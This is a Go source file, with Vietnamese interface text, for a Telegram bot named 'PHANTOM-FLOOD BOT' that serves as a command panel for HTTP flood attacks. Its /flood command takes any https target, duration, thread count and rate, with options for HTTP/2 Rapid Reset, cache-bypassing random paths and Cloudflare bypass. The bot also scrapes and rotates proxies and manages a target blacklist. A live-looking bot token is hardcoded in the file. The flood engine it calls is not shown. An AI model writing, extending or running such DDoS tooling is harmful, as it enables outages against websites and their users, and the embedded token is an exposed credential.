package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
)

// ==================== CẤU HÌNH ====================
var BOT_TOKEN = getEnvOrDefault("BOT_TOKEN", "6382382620:AAFkTfdDxZJoK7g1DAdyle-22f-K62eLuWE")
var ALLOWED_USERS = []int64{} // Thêm Telegram User ID được phép sử dụng, để trống = cho phép tất cả
const PROXY_FILE = "proxy.txt"
const BLACKLIST_FILE = "blacklist.txt"

// =====================================================

// Telegram API Types
type Update struct {
	UpdateID int64    `json:"update_id"`
	Message  *Message `json:"message"`
}

type Message struct {
	MessageID int64  `json:"message_id"`
	From      *User  `json:"from"`
	Chat      *Chat  `json:"chat"`
	Text      string `json:"text"`
}

type User struct {
	ID int64 `json:"id"`
}

type Chat struct {
	ID int64 `json:"id"`
}

type SendMessageRequest struct {
	ChatID    int64  `json:"chat_id"`
	Text      string `json:"text"`
	ParseMode string `json:"parse_mode,omitempty"`
}

type EditMessageRequest struct {
	ChatID    int64  `json:"chat_id"`
	MessageID int64  `json:"message_id"`
	Text      string `json:"text"`
	ParseMode string `json:"parse_mode,omitempty"`
}

type SendMessageResponse struct {
	OK     bool `json:"ok"`
	Result struct {
		MessageID int64 `json:"message_id"`
	} `json:"result"`
}

// Attack info
type AttackInfo struct {
	Process   *exec.Cmd
	Target    string
	StartTime time.Time
	Duration  int
	ChatID    int64
	UserID    int64
	CancelCtx chan struct{}
}

var (
	activeAttacks = make(map[string]*AttackInfo)
	attacksMutex  sync.RWMutex
	httpClient    = &http.Client{Timeout: 30 * time.Second}
	blacklistMutex sync.RWMutex
	blacklist      = make(map[string]bool)
)

func getEnvOrDefault(key, defaultVal string) string {
	if val := os.Getenv(key); val != "" {
		return val
	}
	return defaultVal
}

func isAllowed(userID int64) bool {
	if len(ALLOWED_USERS) == 0 {
		return true
	}
	for _, id := range ALLOWED_USERS {
		if id == userID {
			return true
		}
	}
	return false
}

func formatDuration(seconds int) string {
	h := seconds / 3600
	m := (seconds % 3600) / 60
	s := seconds % 60
	return fmt.Sprintf("%dh %dm %ds", h, m, s)
}

func telegramAPI(method string, data interface{}) ([]byte, error) {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/%s", BOT_TOKEN, method)

	jsonData, err := json.Marshal(data)
	if err != nil {
		return nil, err
	}

	resp, err := httpClient.Post(url, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	return io.ReadAll(resp.Body)
}

func sendMessage(chatID int64, text string, parseMode string) (int64, error) {
	req := SendMessageRequest{
		ChatID:    chatID,
		Text:      text,
		ParseMode: parseMode,
	}

	respBody, err := telegramAPI("sendMessage", req)
	if err != nil {
		return 0, err
	}

	var resp SendMessageResponse
	if err := json.Unmarshal(respBody, &resp); err != nil {
		return 0, err
	}

	return resp.Result.MessageID, nil
}

func editMessage(chatID int64, messageID int64, text string, parseMode string) error {
	req := EditMessageRequest{
		ChatID:    chatID,
		MessageID: messageID,
		Text:      text,
		ParseMode: parseMode,
	}
	_, err := telegramAPI("editMessageText", req)
	return err
}

func getUpdates(offset int64) ([]Update, error) {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/getUpdates?offset=%d&timeout=30", BOT_TOKEN, offset)

	resp, err := httpClient.Get(url)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	var result struct {
		OK     bool     `json:"ok"`
		Result []Update `json:"result"`
	}

	if err := json.Unmarshal(body, &result); err != nil {
		return nil, err
	}

	return result.Result, nil
}

func parseArgs(str string) []string {
	var args []string
	var current strings.Builder
	inQuotes := false
	quoteChar := rune(0)

	for _, char := range str {
		if (char == '"' || char == '\'') && !inQuotes {
			inQuotes = true
			quoteChar = char
		} else if char == quoteChar && inQuotes {
			inQuotes = false
			quoteChar = 0
		} else if char == ' ' && !inQuotes {
			if current.Len() > 0 {
				args = append(args, strings.TrimSpace(current.String()))
				current.Reset()
			}
		} else {
			current.WriteRune(char)
		}
	}

	if current.Len() > 0 {
		args = append(args, strings.TrimSpace(current.String()))
	}

	return args
}

func getSystemInfo() string {
	var m runtime.MemStats
	runtime.ReadMemStats(&m)

	totalMem := float64(m.Sys) / 1024 / 1024 / 1024
	usedMem := float64(m.Alloc) / 1024 / 1024 / 1024

	return fmt.Sprintf("RAM Usage: %.1f%% (%.2fGB / %.2fGB)",
		(usedMem/totalMem)*100, usedMem, totalMem)
}

// ==================== BLACKLIST FUNCTIONS ====================

func loadBlacklist() {
	blacklistMutex.Lock()
	defer blacklistMutex.Unlock()

	data, err := os.ReadFile(BLACKLIST_FILE)
	if err != nil {
		return
	}

	lines := strings.Split(string(data), "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" {
			blacklist[line] = true
		}
	}
}

func saveBlacklist() error {
	blacklistMutex.RLock()
	defer blacklistMutex.RUnlock()

	var lines []string
	for url := range blacklist {
		lines = append(lines, url)
	}

	return os.WriteFile(BLACKLIST_FILE, []byte(strings.Join(lines, "\n")), 0644)
}

func isBlacklisted(url string) bool {
	blacklistMutex.RLock()
	defer blacklistMutex.RUnlock()
	return blacklist[url]
}

func addToBlacklist(url string) {
	blacklistMutex.Lock()
	blacklist[url] = true
	blacklistMutex.Unlock()
	saveBlacklist()
}

func removeFromBlacklist(url string) bool {
	blacklistMutex.Lock()
	_, exists := blacklist[url]
	if exists {
		delete(blacklist, url)
	}
	blacklistMutex.Unlock()
	saveBlacklist()
	return exists
}

func getBlacklistCount() int {
	blacklistMutex.RLock()
	defer blacklistMutex.RUnlock()
	return len(blacklist)
}

func getBlacklistItems() []string {
	blacklistMutex.RLock()
	defer blacklistMutex.RUnlock()
	
	var items []string
	for url := range blacklist {
		items = append(items, url)
	}
	return items
}

// ==================== HANDLERS ====================

func handleStart(chatID int64, userID int64) {
	if !isAllowed(userID) {
		sendMessage(chatID, "⛔ Bạn không có quyền sử dụng bot này.", "")
		return
	}

	welcomeMessage := `🔥 *PHANTOM-FLOOD BOT* 🔥
💀 Telegram Control Panel 💀

*Các lệnh có sẵn:*

/flood - Bắt đầu tấn công
/stop - Dừng tấn công đang chạy
/status - Xem trạng thái các cuộc tấn công
/proxy - Xem danh sách proxy
/getproxy - Lấy proxy mới
/blacklist - Xem danh sách blacklist
/blacklist_add <url> - Thêm URL vào blacklist
/blacklist_remove <url> - Xóa URL khỏi blacklist
/help - Xem hướng dẫn chi tiết

📌 *Ví dụ nhanh:*
` + "`/flood https://target.com 120 10 90`"

	sendMessage(chatID, welcomeMessage, "Markdown")
}

func handleHelp(chatID int64, userID int64) {
	if !isAllowed(userID) {
		sendMessage(chatID, "⛔ Bạn không có quyền sử dụng bot này.", "")
		return
	}

	helpMessage := `📖 *HƯỚNG DẪN SỬ DỤNG*

*Cú pháp:*
` + "`/flood <target> <time> <threads> <ratelimit> [options]`" + `

*Tham số bắt buộc:*
• ` + "`target`" + ` - URL mục tiêu (https://...)
• ` + "`time`" + ` - Thời gian tấn công (giây)
• ` + "`threads`" + ` - Số luồng (khuyến nghị: 5-20)
• ` + "`ratelimit`" + ` - Giới hạn request/giây

*Tham số tùy chọn:*
• ` + "`--proxy <file>`" + ` - File proxy (mặc định: proxy.txt)
• ` + "`--debug`" + ` - Chế độ debug chi tiết
• ` + "`--reset`" + ` - Bật chế độ Rapid Reset (mạnh hơn)
• ` + "`--randpath`" + ` - Random paths để bypass cache
• ` + "`--close`" + ` - Đóng socket khi gặp 429
• ` + "`--browser <N>`" + ` - Max concurrent browsers (Cloudflare bypass)

*Quản lý Blacklist:*
` + "`/blacklist`" + ` - Xem danh sách
` + "`/blacklist_add <url>`" + ` - Thêm URL
` + "`/blacklist_remove <url>`" + ` - Xóa URL

*Ví dụ:*
` + "```" + `
/flood https://target.com 120 10 90
/flood https://target.com 120 10 90 --reset --debug
/blacklist_add https://protected-site.com
` + "```"

	sendMessage(chatID, helpMessage, "Markdown")
}

func handleFlood(chatID int64, userID int64, argsString string) {
	if !isAllowed(userID) {
		sendMessage(chatID, "⛔ Bạn không có quyền sử dụng bot này.", "")
		return
	}

	argsString = strings.TrimSpace(argsString)
	if argsString == "" {
		msg := `❌ *Thiếu tham số!*

*Cú pháp:* ` + "`/flood <target> <time> <threads> <ratelimit> [options]`" + `

*Ví dụ:* ` + "`/flood https://target.com 120 10 90`" + `

Gõ /help để xem hướng dẫn chi tiết.`
		sendMessage(chatID, msg, "Markdown")
		return
	}

	args := parseArgs(argsString)
	if len(args) < 4 {
		msg := `❌ *Thiếu tham số!*

Cần ít nhất 4 tham số: target, time, threads, ratelimit

*Ví dụ:* ` + "`/flood https://target.com 120 10 90`"
		sendMessage(chatID, msg, "Markdown")
		return
	}

	target := args[0]
	timeVal, err1 := strconv.Atoi(args[1])
	threads, err2 := strconv.Atoi(args[2])
	ratelimit, err3 := strconv.Atoi(args[3])
	options := args[4:]

	// Validate
	if !strings.HasPrefix(target, "https://") {
		sendMessage(chatID, "❌ Target phải bắt đầu bằng `https://`", "Markdown")
		return
	}

	// Check blacklist
	if isBlacklisted(target) {
		sendMessage(chatID, "🚫 *URL này đã bị BLACKLIST!*\n\nKhông thể tấn công mục tiêu này.", "Markdown")
		return
	}

	if err1 != nil || timeVal < 1 || timeVal > 900000 {
		sendMessage(chatID, "❌ Thời gian phải từ 1-900000 giây", "")
		return
	}

	if err2 != nil || threads < 1 || threads > 100 {
		sendMessage(chatID, "❌ Threads phải từ 1-100", "")
		return
	}

	if err3 != nil || ratelimit < 1 {
		sendMessage(chatID, "❌ Ratelimit phải >= 1", "")
		return
	}

	// Parse options
	proxyFile := PROXY_FILE
	debugMode := false
	captchaMode := false

	optionsStr := ""
	if len(options) > 0 {
		optionsStr = "\n🔧 *Options:* " + strings.Join(options, " ")
		for i := 0; i < len(options); i++ {
			opt := options[i]
			if opt == "--proxy" && i+1 < len(options) {
				proxyFile = options[i+1]
				i++
			} else if opt == "--debug" {
				debugMode = true
			} else if opt == "--browser" {
				captchaMode = true
			}
		}
	}

	baseDir, _ := os.Getwd()
	proxyPath := filepath.Join(baseDir, proxyFile)

	if _, err := os.Stat(proxyPath); os.IsNotExist(err) {
		msg := fmt.Sprintf("❌ File proxy `%s` không tồn tại.\n\nDùng /getproxy để lấy proxy mới.", proxyFile)
		sendMessage(chatID, msg, "Markdown")
		return
	}

	startMessage := fmt.Sprintf(`🚀 *BẮT ĐẦU TẤN CÔNG*

🎯 *Target:* `+"`%s`"+`
⏱ *Thời gian:* %s
🔀 *Threads:* %d
📊 *Rate:* %d req/s
📁 *Proxy:* %s%s

💀 Đang khởi động flood.go...`, target, formatDuration(timeVal), threads, ratelimit, proxyFile, optionsStr)

	sendMessage(chatID, startMessage, "Markdown")

	attackID := fmt.Sprintf("%d_%d", chatID, time.Now().UnixNano())
	cancelChan := make(chan struct{})

	attacksMutex.Lock()
	activeAttacks[attackID] = &AttackInfo{
		Process:   nil,
		Target:    target,
		StartTime: time.Now(),
		Duration:  timeVal,
		ChatID:    chatID,
		UserID:    userID,
		CancelCtx: cancelChan,
	}
	attacksMutex.Unlock()

	// Buffer để lưu output
	var outputBuffer strings.Builder
	var outputMutex sync.Mutex
	var statusMessageID int64

	// Set callback để nhận output từ flood.go
	SetOutputCallback(func(msg string) {
		outputMutex.Lock()
		outputBuffer.WriteString(msg)
		outputMutex.Unlock()
	})

	// Goroutine gửi output lên Telegram mỗi 5 giây
	go func() {
		ticker := time.NewTicker(5 * time.Second)
		defer ticker.Stop()

		for {
			select {
			case <-cancelChan:
				return
			case <-ticker.C:
				outputMutex.Lock()
				content := outputBuffer.String()
				outputBuffer.Reset()
				outputMutex.Unlock()

				if strings.TrimSpace(content) != "" {
					lines := strings.Split(content, "\n")
					if len(lines) > 20 {
						lines = lines[len(lines)-20:]
					}
					lastLines := strings.Join(lines, "\n")
					if len(lastLines) > 3500 {
						lastLines = lastLines[len(lastLines)-3500:]
					}

					formattedMsg := fmt.Sprintf("📤 *Output (5s):*\n```\n%s\n```", lastLines)

					if statusMessageID == 0 {
						msgID, err := sendMessage(chatID, formattedMsg, "Markdown")
						if err == nil {
							statusMessageID = msgID
						}
					} else {
						if err := editMessage(chatID, statusMessageID, formattedMsg, "Markdown"); err != nil {
							msgID, _ := sendMessage(chatID, formattedMsg, "Markdown")
							statusMessageID = msgID
						}
					}
				}
			}
		}
	}()

	// Chạy flood trong goroutine với context
	go func() {
		defer func() {
			SetOutputCallback(nil)
			close(cancelChan)
			attacksMutex.Lock()
			delete(activeAttacks, attackID)
			attacksMutex.Unlock()
		}()

		// Gọi RunFlood với cancelChan
		RunFloodWithContext(target, timeVal, threads, ratelimit, proxyPath, debugMode, captchaMode, cancelChan)

		endMessage := fmt.Sprintf("✅ *TẤN CÔNG HOÀN TẤT*\n\n🎯 Target: `%s`", target)
		sendMessage(chatID, endMessage, "Markdown")
	}()
}

func handleStop(chatID int64, userID int64) {
	if !isAllowed(userID) {
		sendMessage(chatID, "⛔ Bạn không có quyền sử dụng bot này.", "")
		return
	}

	stoppedCount := 0

	attacksMutex.Lock()
	for attackID, attack := range activeAttacks {
		if attack.ChatID == chatID || attack.UserID == userID {
			// Close context channel để signal stop
			select {
			case <-attack.CancelCtx:
				// Already closed
			default:
				close(attack.CancelCtx)
			}

			// Kill process nếu có
			if attack.Process != nil && attack.Process.Process != nil {
				if runtime.GOOS == "windows" {
					attack.Process.Process.Kill()
				} else {
					attack.Process.Process.Signal(syscall.SIGINT)
				}
			}

			delete(activeAttacks, attackID)
			stoppedCount++
		}
	}
	attacksMutex.Unlock()

	if stoppedCount > 0 {
		sendMessage(chatID, fmt.Sprintf("🛑 Đã dừng %d cuộc tấn công.", stoppedCount), "")
	} else {
		sendMessage(chatID, "ℹ️ Không có cuộc tấn công nào đang chạy.", "")
	}
}

func handleStatus(chatID int64, userID int64) {
	if !isAllowed(userID) {
		sendMessage(chatID, "⛔ Bạn không có quyền sử dụng bot này.", "")
		return
	}

	type attackStatus struct {
		Target    string
		Elapsed   string
		Remaining string
	}

	var userAttacks []attackStatus

	attacksMutex.RLock()
	for _, attack := range activeAttacks {
		if attack.ChatID == chatID || attack.UserID == userID {
			elapsed := int(time.Since(attack.StartTime).Seconds())
			remaining := attack.Duration - elapsed
			if remaining < 0 {
				remaining = 0
			}

			userAttacks = append(userAttacks, attackStatus{
				Target:    attack.Target,
				Elapsed:   formatDuration(elapsed),
				Remaining: formatDuration(remaining),
			})
		}
	}
	attacksMutex.RUnlock()

	sysInfo := getSystemInfo()

	if len(userAttacks) == 0 {
		msg := fmt.Sprintf(`ℹ️ *Không có cuộc tấn công nào đang chạy.*

🖥 *System Info:*
%s`, sysInfo)
		sendMessage(chatID, msg, "Markdown")
		return
	}

	statusMessage := "📊 *TRẠNG THÁI TẤN CÔNG*\n\n"
	statusMessage += fmt.Sprintf("🖥 *System Info:*\n`%s`\n\n", sysInfo)
	statusMessage += "--------------------------------\n\n"

	for i, attack := range userAttacks {
		statusMessage += fmt.Sprintf("*%d.* `%s`\n", i+1, attack.Target)
		statusMessage += fmt.Sprintf("   ⏱ Đã chạy: %s\n", attack.Elapsed)
		statusMessage += fmt.Sprintf("   ⏳ Còn lại: %s\n\n", attack.Remaining)
	}

	sendMessage(chatID, statusMessage, "Markdown")
}

func handleProxy(chatID int64, userID int64) {
	if !isAllowed(userID) {
		sendMessage(chatID, "⛔ Không có quyền.", "")
		return
	}

	baseDir, _ := os.Getwd()
	proxyPath := filepath.Join(baseDir, PROXY_FILE)

	data, err := os.ReadFile(proxyPath)
	if err != nil {
		sendMessage(chatID, "❌ File proxy chưa tồn tại.", "")
		return
	}

	lines := strings.Split(string(data), "\n")
	var nonEmpty []string
	for _, line := range lines {
		if strings.TrimSpace(line) != "" {
			nonEmpty = append(nonEmpty, line)
		}
	}

	count := len(nonEmpty)
	preview := nonEmpty
	if len(preview) > 15 {
		preview = preview[:15]
	}

	msg := fmt.Sprintf("📁 *Proxy List*\n📊 Tổng: %d\n\nXem trước (15 dòng):\n```\n%s\n```",
		count, strings.Join(preview, "\n"))
	sendMessage(chatID, msg, "Markdown")
}

func handleGetProxy(chatID int64, userID int64) {
	if !isAllowed(userID) {
		sendMessage(chatID, "⛔ Không có quyền.", "")
		return
	}

	sendMessage(chatID, "🔄 Đang chạy tool lấy proxy...", "")

	go func() {
		RunProxyScraper(true)

		baseDir, _ := os.Getwd()
		proxyPath := filepath.Join(baseDir, PROXY_FILE)
		if data, err := os.ReadFile(proxyPath); err == nil {
			lines := strings.Split(string(data), "\n")
			count := 0
			for _, line := range lines {
				if strings.TrimSpace(line) != "" {
					count++
				}
			}
			sendMessage(chatID, fmt.Sprintf("✅ Đã lấy proxy xong! Tổng hiện tại: %d", count), "")
		} else {
			sendMessage(chatID, "✅ Đã chạy xong nhưng không thấy file proxy.", "")
		}
	}()
}

func handleBlacklist(chatID int64, userID int64) {
	if !isAllowed(userID) {
		sendMessage(chatID, "⛔ Không có quyền.", "")
		return
	}

	items := getBlacklistItems()
	count := getBlacklistCount()

	if count == 0 {
		sendMessage(chatID, "📋 *Blacklist trống*\n\nChưa có URL nào bị chặn.", "Markdown")
		return
	}

	preview := items
	if len(preview) > 20 {
		preview = preview[:20]
	}

	msg := fmt.Sprintf("📋 *Blacklist*\n🚫 Tổng: %d URL\n\nDanh sách:\n```\n%s\n```",
		count, strings.Join(preview, "\n"))
	
	if len(items) > 20 {
		msg += fmt.Sprintf("\n... và %d URL khác", len(items)-20)
	}
	
	sendMessage(chatID, msg, "Markdown")
}

func handleBlacklistAdd(chatID int64, userID int64, argsString string) {
	if !isAllowed(userID) {
		sendMessage(chatID, "⛔ Không có quyền.", "")
		return
	}

	url := strings.TrimSpace(argsString)
	if url == "" {
		msg := `❌ *Thiếu URL!*

*Cú pháp:* ` + "`/blacklist_add <url>`" + `

*Ví dụ:* ` + "`/blacklist_add https://protected-site.com`"
		sendMessage(chatID, msg, "Markdown")
		return
	}

	if !strings.HasPrefix(url, "https://") && !strings.HasPrefix(url, "http://") {
		sendMessage(chatID, "❌ URL phải bắt đầu bằng `https://` hoặc `http://`", "Markdown")
		return
	}

	if isBlacklisted(url) {
		sendMessage(chatID, fmt.Sprintf("ℹ️ URL `%s` đã có trong blacklist rồi.", url), "Markdown")
		return
	}

	addToBlacklist(url)
	count := getBlacklistCount()
	
	msg := fmt.Sprintf("✅ *Đã thêm vào blacklist!*\n\n🚫 URL: `%s`\n📊 Tổng: %d URL", url, count)
	sendMessage(chatID, msg, "Markdown")
}

func handleBlacklistRemove(chatID int64, userID int64, argsString string) {
	if !isAllowed(userID) {
		sendMessage(chatID, "⛔ Không có quyền.", "")
		return
	}

	url := strings.TrimSpace(argsString)
	if url == "" {
		msg := `❌ *Thiếu URL!*

*Cú pháp:* ` + "`/blacklist_remove <url>`" + `

*Ví dụ:* ` + "`/blacklist_remove https://protected-site.com`"
		sendMessage(chatID, msg, "Markdown")
		return
	}

	if removeFromBlacklist(url) {
		count := getBlacklistCount()
		msg := fmt.Sprintf("✅ *Đã xóa khỏi blacklist!*\n\n🔓 URL: `%s`\n📊 Còn lại: %d URL", url, count)
		sendMessage(chatID, msg, "Markdown")
	} else {
		sendMessage(chatID, fmt.Sprintf("❌ URL `%s` không có trong blacklist.", url), "Markdown")
	}
}

func startProxyScraper() {
	runScraper := func() {
		fmt.Println("[SYSTEM] Đang cập nhật proxy list (Background)...")
		go RunProxyScraper(true)
	}

	runScraper()

	go func() {
		ticker := time.NewTicker(10 * time.Minute)
		for range ticker.C {
			runScraper()
		}
	}()
}

func handleMessage(msg *Message) {
	if msg == nil || msg.Text == "" {
		return
	}

	chatID := msg.Chat.ID
	userID := msg.From.ID
	text := msg.Text

	switch {
	case strings.HasPrefix(text, "/start"):
		handleStart(chatID, userID)

	case strings.HasPrefix(text, "/help"):
		handleHelp(chatID, userID)

	case strings.HasPrefix(text, "/flood"):
		argsString := strings.TrimPrefix(text, "/flood")
		handleFlood(chatID, userID, argsString)

	case strings.HasPrefix(text, "/stop"):
		handleStop(chatID, userID)

	case strings.HasPrefix(text, "/status"):
		handleStatus(chatID, userID)

	case strings.HasPrefix(text, "/blacklist_add"):
		argsString := strings.TrimPrefix(text, "/blacklist_add")
		handleBlacklistAdd(chatID, userID, argsString)

	case strings.HasPrefix(text, "/blacklist_remove"):
		argsString := strings.TrimPrefix(text, "/blacklist_remove")
		handleBlacklistRemove(chatID, userID, argsString)

	case strings.HasPrefix(text, "/blacklist"):
		handleBlacklist(chatID, userID)

	case strings.HasPrefix(text, "/proxy") && !strings.HasPrefix(text, "/getproxy"):
		handleProxy(chatID, userID)

	case strings.HasPrefix(text, "/getproxy"):
		handleGetProxy(chatID, userID)
	}
}

func main() {
	fmt.Println("🤖 Telegram Bot đã khởi động!")
	fmt.Println("📌 Sử dụng /start để bắt đầu")

	// Load blacklist
	loadBlacklist()
	fmt.Printf("📋 Đã load %d URL từ blacklist\n", getBlacklistCount())

	startProxyScraper()

	var offset int64 = 0

	for {
		updates, err := getUpdates(offset)
		if err != nil {
			fmt.Println("Polling error:", err)
			time.Sleep(5 * time.Second)
			continue
		}

		for _, update := range updates {
			offset = update.UpdateID + 1
			go handleMessage(update.Message)
		}
	}
}

